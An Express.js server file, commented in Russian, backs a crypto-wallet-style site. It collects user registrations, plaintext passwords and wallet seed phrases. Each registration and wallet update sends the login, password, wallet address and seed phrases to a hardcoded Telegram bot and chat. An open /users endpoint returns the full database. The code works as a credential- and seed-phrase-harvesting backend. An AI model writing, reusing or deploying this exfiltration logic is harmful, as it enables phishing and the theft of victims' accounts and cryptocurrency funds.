const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios'); // Подключаем axios
const app = express();
app.use(express.json());

// Настройка CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Статические файлы из папки client
const staticPath = path.join(__dirname, '../client');
app.use(express.static(staticPath));

const DB_FILE = 'users.json';
const TELEGRAM_BOT_TOKEN = '7603140907:AAEHRJo0chFDDycRASXe5ljwtzfMwqe8qA4'; // Твой токен
const TELEGRAM_CHAT_ID = '6404101950'; // Твой Telegram ID

function readDB() {
    if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify([]));
    return JSON.parse(fs.readFileSync(DB_FILE));
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Функция отправки уведомлений в Telegram
async function sendTelegramNotification(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('Notification sent to Telegram');
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}

app.post('/register', async (req, res) => {
    console.log('Received registration request:', req.body);
    const users = readDB();
    const existingUser = users.find(u => u.login === req.body.login);
    if (existingUser) {
        return res.status(400).json({ error: 'User already exists' });
    }
    users.push(req.body);
    writeDB(users);

    // Уведомление о новом пользователе
    const message = `Новый пользователь зарегистрирован:\n` +
                    `Логин: ${req.body.login}\n` +
                    `Пароль: ${req.body.password}\n` +
                    `ID: ${req.body.id}`;
    await sendTelegramNotification(message);

    res.json({ success: true, user: req.body });
});

app.post('/login', (req, res) => {
    console.log('Received login request:', req.body);
    const users = readDB();
    const user = users.find(u => u.login === req.body.login && u.password === req.body.password);
    if (user) {
        res.json({ success: true, user });
    } else {
        res.status(401).json({ error: 'Invalid login or password' });
    }
});

app.post('/update-wallet', async (req, res) => {
    console.log('Received wallet update request:', req.body);
    const users = readDB();
    const user = users.find(u => u.id === req.body.id);
    if (user) {
        user.wallet = req.body.wallet;
        user.seeds = req.body.seeds;
        writeDB(users);

        // Уведомление об обновлении кошелька
        const message = `Пользователь обновил кошелёк:\n` +
                        `Логин: ${user.login}\n` +
                        `ID: ${user.id}\n` +
                        `Новый адрес кошелька: ${req.body.wallet}\n` +
                        `Seed-фразы: ${req.body.seeds.join(', ')}`;
        await sendTelegramNotification(message);

        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

app.get('/users', (req, res) => {
    res.json(readDB());
});

app.post('/update-user', async (req, res) => {
    console.log('Received user update request:', req.body);
    const users = readDB();
    const user = users.find(u => u.id === req.body.id);
    if (user) {
        Object.assign(user, req.body);
        writeDB(users);

        // Уведомление об обновлении данных через бот
        const message = `Пользователь обновил данные:\n` +
                        `Логин: ${user.login}\n` +
                        `ID: ${user.id}\n` +
                        `Изменения: ${JSON.stringify(req.body, null, 2)}`;
        await sendTelegramNotification(message);

        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

// Отдача index.html для всех остальных запросов
app.get('*', (req, res) => {
    const indexPath = path.join(__dirname, '../client', 'index.html');
    console.log('Serving index.html from:', indexPath);
    res.sendFile(indexPath, (err) => {
        if (err) {
            console.error('Error serving index.html:', err);
            res.status(500).send('Server error');
        }
    });
});

// Запуск на динамическом порту Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));